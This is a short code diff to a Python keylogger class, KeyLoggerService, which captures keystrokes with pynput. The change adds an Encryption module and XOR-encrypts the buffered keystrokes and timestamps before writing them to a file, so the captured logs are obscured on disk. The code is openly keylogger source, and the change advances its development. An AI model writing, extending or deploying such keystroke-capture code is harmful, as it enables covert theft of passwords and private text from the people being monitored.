@@ -3,6 +3,7 @@ from datetime import datetime
 from pynput import keyboard
 from file_writer import FileWriter
 import threading
+from encrypt import Encryption
 
 
 class KeyLoggerService:
@@ -12,6 +13,7 @@ class KeyLoggerService:
         self.key_buffer = []
         self.lock = threading.Lock()
         self.run_time = run_time
+        self.encryption = Encryption()
 
 
     def start_monitoring(self):
@@ -49,7 +51,8 @@ class KeyLoggerService:
                     time_day_ = datetime.now().strftime('%Y-%m-%d')
                     buffer.append(time_)
                     buffer.append(time_day_)
-                    FileWriter(buffer)
+                    encrypted_data = self.encryption.xor_encryption(''.join(buffer))
+                    FileWriter([encrypted_data])
 
     def stop_listener(self):
         self.keyboard_listener.stop()
